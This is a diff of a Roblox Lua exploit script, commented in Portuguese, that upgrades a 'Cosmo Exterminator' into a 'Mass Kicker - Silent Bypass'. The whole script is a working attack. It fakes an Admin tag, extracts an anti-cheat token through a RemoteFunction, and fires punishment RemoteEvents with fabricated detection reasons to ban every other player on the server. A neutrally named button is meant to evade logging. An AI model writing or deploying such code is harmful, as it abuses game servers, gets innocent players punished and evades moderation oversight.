@@ -1,58 +1,72 @@
 --[[ 
-    COSMO EXTERMINATOR V9
-    Explora a falha de validação de Admin e o Remote de punição.
+    MASS KICKER - SILENT BYPASS V10
+    Alvos: Todos os Humanoides (exceto você)
 ]]
 
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local localPlayer = Players.LocalPlayer
 
--- 1. CLOAK DE ADMIN (Engana a função Punish do Cosmo)
-local adminTag = Instance.new("BoolValue")
-adminTag.Name = "Admin"
-adminTag.Value = true
-adminTag.Parent = localPlayer
+-- 1. IMUNIDADE LOCAL (Falsa tag de Admin)
+local admin = Instance.new("BoolValue")
+admin.Name = "Admin"
+admin.Value = true
+admin.Parent = localPlayer
 
--- 2. LOCALIZAR O CANAL DE PUNIÇÃO (Pasta 'ç' detectada no cosmo2.txt)
-local replicatedFolder = ReplicatedStorage:WaitForChild("Replicated", 5)
-local punishmentRemote = nil
-
-if replicatedFolder then
-    local eventsFolder = replicatedFolder:FindFirstChild("ç")
-    if eventsFolder then
-        punishmentRemote = eventsFolder:FindFirstChildOfClass("RemoteEvent")
-    end
-end
-
--- 3. FUNÇÃO DE EXTERMÍNIO
-local function kickEveryone()
-    if not punishmentRemote then 
-        print("Falha: Remote de punição não encontrado.")
-        return 
-    end
-
-    for _, v in pairs(Players:GetPlayers()) do
-        if v ~= localPlayer then
-            -- Dispara o remote fingindo que o alvo usou um exploit pesado
-            -- Isso ativa o Punish(player, "Ban", reason) do servidor
-            punishmentRemote:FireServer("Exploit Detectado: Synapse V3 Injection")
-            print("Sinal de banimento enviado para: " .. v.Name)
+-- 2. CAPTURA DO TOKEN DO VB ANTI-CHEAT
+local function getVBToken()
+    for _, v in pairs(ReplicatedStorage:GetChildren()) do
+        if v:IsA("RemoteFunction") and v:GetAttribute("oyvey") then
+            return v:InvokeServer("THUG") -- A falha que nos dá a chave 
         end
     end
 end
 
--- Interface Simples e Silenciosa (Evita LogService)
-local screenGui = Instance.new("ScreenGui", game:GetService("CoreGui"))
-local btn = Instance.new("TextButton", screenGui)
-btn.Size = UDim2.new(0, 200, 0, 50)
-btn.Position = UDim2.new(0.5, -100, 0.1, 0)
-btn.Text = "LIMPAR SERVIDOR (MASS KICK)"
-btn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
-btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+-- 3. LOCALIZAR O REMOTE DE PUNIÇÃO DO COSMO
+local function getCosmoRemote()
+    local rep = ReplicatedStorage:FindFirstChild("Replicated")
+    if rep then
+        local folder = rep:FindFirstChild("ç")
+        if folder then
+            return folder:FindFirstChildOfClass("RemoteEvent")
+        end
+    end
+end
 
-btn.MouseButton1Click:Connect(function()
-    kickEveryone()
-    btn.Text = "COMANDO ENVIADO!"
-    wait(2)
-    btn.Text = "LIMPAR SERVIDOR (MASS KICK)"
+local function exterminate()
+    local token = getVBToken()
+    local cosmoRemote = getCosmoRemote()
+    
+    for _, target in pairs(Players:GetPlayers()) do
+        if target ~= localPlayer and target.Character then
+            -- Tentativa 1: Forçar banimento via Cosmo (Remote 'ç') [cite: 42]
+            if cosmoRemote then
+                cosmoRemote:FireServer("Detection: FlyHack")
+            end
+            
+            -- Tentativa 2: Sequestro de log do VB (Remote 'thugshaker') [cite: 32, 33]
+            -- Usamos o token capturado para o servidor aceitar o comando
+            for _, v in pairs(ReplicatedStorage:GetChildren()) do
+                if v:IsA("RemoteEvent") and v:GetAttribute("oyvey") then
+                    v:FireServer(token, 1) -- Motivo 1: Fling/Noclip [cite: 29]
+                end
+            end
+        end
+    end
+end
+
+-- Botão Invisível para o LogService 
+local sg = Instance.new("ScreenGui", game:GetService("CoreGui"))
+local b = Instance.new("TextButton", sg)
+b.Name = "X9_Utility" -- Nome neutro
+b.Size = UDim2.new(0, 50, 0, 50)
+b.Position = UDim2.new(0, 10, 0.5, 0)
+b.Text = "K"
+b.BackgroundTransparency = 0.5
+
+b.MouseButton1Click:Connect(function()
+    exterminate()
+    b.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+    task.wait(1)
+    b.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 end)
